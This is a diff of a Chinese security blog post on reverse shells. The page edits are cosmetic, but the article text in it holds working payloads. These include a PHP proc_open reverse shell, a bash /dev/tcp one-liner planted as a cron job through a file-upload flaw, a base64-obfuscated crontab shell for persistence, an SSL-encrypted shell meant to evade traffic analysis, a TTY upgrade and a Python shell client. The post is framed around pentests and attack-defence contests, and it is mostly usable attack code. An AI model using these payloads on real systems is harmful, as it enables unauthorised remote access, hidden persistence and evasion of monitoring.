@@ -16,7 +16,7 @@
 <meta property="og:site_name" content="geez博客">
 <meta property="og:description" content="反弹shell">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-08-29T15:39:15.519Z">
+<meta property="og:updated_time" content="2019-08-29T15:41:36.032Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="关于反弹shell的那些事">
 <meta name="twitter:description" content="反弹shell">
@@ -197,15 +197,13 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h4 id="众所周知的反弹shell"><a href="#众所周知的反弹shell" class="headerlink" title="众所周知的反弹shell"></a>众所周知的反弹shell</h4><hr>
-<p>我们拿到webshell后如果想进一步搞事情，那么肯定绕不过反弹shell。即使有蚁剑，菜刀这样的神器，但是非交互式的shell仍有很多不好用的地方。<br>先说反弹shell吧，反弹shell的方法很多，各个语言有各个语言的方式，这里不是为了介绍这些的，当然还是贴一个大佬朋友的博客<a href="https://www.kkzevip.com/?post=21" target="_blank" rel="noopener">&gt;点击这里&lt;</a>，你们可以去上面看看他的总结。<br>另外，补充一个现实非常好用的php反弹shell的脚本，可以说我用这个脚本反弹从来没失败过。</p>
+        <h4 id="众所周知的反弹shell"><a href="#众所周知的反弹shell" class="headerlink" title="众所周知的反弹shell"></a>众所周知的反弹shell</h4><p>我们拿到webshell后如果想进一步搞事情，那么肯定绕不过反弹shell。即使有蚁剑，菜刀这样的神器，但是非交互式的shell仍有很多不好用的地方。<br>先说反弹shell吧，反弹shell的方法很多，各个语言有各个语言的方式，这里不是为了介绍这些的，当然还是贴一个大佬朋友的博客<a href="https://www.kkzevip.com/?post=21" target="_blank" rel="noopener">&gt;点击这里&lt;</a>，你们可以去上面看看他的总结。<br>另外，补充一个现实非常好用的php反弹shell的脚本，可以说我用这个脚本反弹从来没失败过。</p>
 <a id="more"></a>
 <p>代码如下，改好ip+port运行即可：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$sock = fsockopen($ip, $port);</span><br><span class="line">$descriptorspec = <span class="keyword">array</span>(</span><br><span class="line">        <span class="number">0</span> =&gt; $sock,</span><br><span class="line">        <span class="number">1</span> =&gt; $sock,</span><br><span class="line">        <span class="number">2</span> =&gt; $sock</span><br><span class="line">);</span><br><span class="line">$process = proc_open(<span class="string">'/bin/sh'</span>, $descriptorspec, $pipes);</span><br><span class="line">proc_close($process);</span><br></pre></td></tr></table></figure>
 
 <p>真的是比网上的那些php反弹shell（比如：php -r ‘$sock=fsockopen(“10.0.0.1”,1234);exec(“/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3”);’）成功率高很多。当然此方法也有限制，限制就是系统没有禁用 proc_popen(默认不禁用)。</p>
-<h4 id="加密的反弹shell"><a href="#加密的反弹shell" class="headerlink" title="加密的反弹shell"></a>加密的反弹shell</h4><hr>
-<p>这个是源于看freebuf的一篇文章，后来才知道原来ssl也可以进行反弹shell的加密。这样我们执行的命令流量就不能被分析出来了（在实战中可能有更大的用处，毕竟留痕更少）。</p>
+<h4 id="加密的反弹shell"><a href="#加密的反弹shell" class="headerlink" title="加密的反弹shell"></a>加密的反弹shell</h4><p>这个是源于看freebuf的一篇文章，后来才知道原来ssl也可以进行反弹shell的加密。这样我们执行的命令流量就不能被分析出来了（在实战中可能有更大的用处，毕竟留痕更少）。</p>
 <ul>
 <li><p>1 首先，vps上生成SSL证书的公私钥对</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</span><br></pre></td></tr></table></figure>
@@ -219,24 +217,21 @@
 </li>
 </ul>
 <p>你可以自己去抓包分析，对比加密反弹和常规反弹包，可以很清楚的知道加密的流量包是分析不出来我们执行了那些命令的。而且由于mkfifo 系统大多数系统自带，所以绝大多数都可以使用这种方式来反弹加密的shell流量。</p>
-<h4 id="利用cron的反弹shell"><a href="#利用cron的反弹shell" class="headerlink" title="利用cron的反弹shell"></a>利用cron的反弹shell</h4><hr>
-<p>有时候我们还没拿到webshell，这时也并一定就没法反弹一个shell出来。这里分享一个例子：<br>曾经有次渗透测试java web网站，网站存在任意文件上传，但是上传的jsp无法执行，可能是需要编译部署后才可执行（黑盒，具体原因现在也没搞清），所以需要其他的思路来拿shell，当时就是利用的任意文件上传cron。文件内容就是下面这样：</p>
+<h4 id="利用cron的反弹shell"><a href="#利用cron的反弹shell" class="headerlink" title="利用cron的反弹shell"></a>利用cron的反弹shell</h4><p>有时候我们还没拿到webshell，这时也并一定就没法反弹一个shell出来。这里分享一个例子：<br>曾经有次渗透测试java web网站，网站存在任意文件上传，但是上传的jsp无法执行，可能是需要编译部署后才可执行（黑盒，具体原因现在也没搞清），所以需要其他的思路来拿shell，当时就是利用的任意文件上传cron。文件内容就是下面这样：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">* * * * * bash -i &gt;&amp; /dev/tcp/192.168.2.15/9999  0&gt;&amp;1</span><br></pre></td></tr></table></figure>
 
 <p>当然如果有webshell 也可以用cron反弹shell（维持权限）：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=system(<span class="string">'echo ZWNobyAiKiAqICogKiAqIGJhc2ggLWMgJ3tlY2hvLFltRnphQ0F0YVNBK0ppQXZaR1YyTDNSamNDOHpPUzR4TURVdU9TNHhMems1T1RrZ01ENG1NUT09fXx7YmFzZTY0LC1kfXx7YmFzaCwtaX0nIiB8Y3JvbnRhYiAt |base64 -d|bash -i'</span>);</span><br></pre></td></tr></table></figure>
 
 <p>这个姿势还常用于awd中的权限维持，可以写好脚本从靶机直接进行flag的提交。另外对crontab不了解的同学可以去深入学习下crontab的结构和知识（很简单的）。</p>
-<h4 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h4><hr>
-<p>上面的都是讲反弹shell，那么反弹shell后怎么拿到一个交互式的shell呢？(ctrl+c断不掉的那种)<br>直接上方法吧（不介绍第三方工具，因为大多数目标环境没有）：</p>
+<h4 id="交互式shell"><a href="#交互式shell" class="headerlink" title="交互式shell"></a>交互式shell</h4><p>上面的都是讲反弹shell，那么反弹shell后怎么拿到一个交互式的shell呢？(ctrl+c断不掉的那种)<br>直接上方法吧（不介绍第三方工具，因为大多数目标环境没有）：</p>
 <ul>
 <li>python实现的弱tty<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c <span class="string">'import pty;	pty.spawn("/bin/bash")'</span></span><br></pre></td></tr></table></figure>
 
 </li>
 </ul>
 <p>为什么是一个弱tty呢 因为ctrl+c 仍可以中断，不过已经够用了 vi su 等等命令已经不是问题了。<br>它可以利用socat和nc来实现强tty不过目前感觉没啥用！感兴趣的去看下这篇文章:  <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/" target="_blank" rel="noopener">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a><br>目前还没发现比这个更好用的交互式shell的利用。以后有了再补充这块吧！</p>
-<h4 id="补充下windows-反弹shell"><a href="#补充下windows-反弹shell" class="headerlink" title="补充下windows 反弹shell"></a>补充下windows 反弹shell</h4><hr>
-<ul>
+<h4 id="补充下windows-反弹shell"><a href="#补充下windows-反弹shell" class="headerlink" title="补充下windows 反弹shell"></a>补充下windows 反弹shell</h4><ul>
 <li><ol>
 <li>毫无疑问msf才是最适合windows反弹shell的工具</li>
 </ol>
@@ -257,8 +252,7 @@
 <p>客户端</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> os,sys</span><br><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TcpClient</span>:</span></span><br><span class="line">    HOST=<span class="string">'127.0.0.1'</span></span><br><span class="line">    PORT=<span class="number">1122</span></span><br><span class="line">    BUFSIZ=<span class="number">2048</span></span><br><span class="line">    ADDR=(HOST, PORT)</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.client=socket(AF_INET, SOCK_STREAM)</span><br><span class="line">        self.client.connect(self.ADDR)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            data=input(<span class="string">'OS Shell &gt;'</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            self.client.send(data.encode(<span class="string">'utf8'</span>))</span><br><span class="line">            print(<span class="string">'Execute %s：%s'</span> %(self.HOST,data))</span><br><span class="line">            <span class="keyword">if</span> data.upper()==<span class="string">"QUIT"</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data=self.client.recv(self.BUFSIZ)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            print(<span class="string">'Receive：%s'</span> %(data.decode(<span class="string">'utf8'</span>)))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    client=TcpClient()</span><br></pre></td></tr></table></figure>
 
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><hr>
-<p>反弹shell的方法五花八门，最重要的还是找到一个依赖最少的，最稳定的反弹shell的方式。</p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>反弹shell的方法五花八门，最重要的还是找到一个依赖最少的，最稳定的反弹shell的方式。</p>
 
       
 
